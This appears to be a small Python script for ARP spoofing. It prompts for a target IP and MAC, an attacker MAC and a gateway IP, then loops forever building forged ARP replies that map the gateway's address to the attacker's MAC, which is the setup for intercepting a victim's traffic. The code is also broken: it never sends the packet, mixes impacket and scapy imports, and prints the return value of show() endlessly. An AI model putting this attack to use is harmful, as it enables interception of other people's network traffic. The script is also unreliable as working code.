from impacket.ImpactPacket import ARP
from scapy.all import*

pdst = input("Enter Taget IP : ")
hwdst = input("Enter Target MAC : ")
hwsrc = input("Enter Attacker MAC : ")
psrc = input("Enter Gateway : ")

while True:
    my_arp_response = ARP()

    my_arp_response.op = 2
    my_arp_response.pdst = pdst
    my_arp_response.hwdst = hwdst
    my_arp_response.hwsrc = hwsrc
    my_arp_response.psrc = psrc

    print(my_arp_response.show())



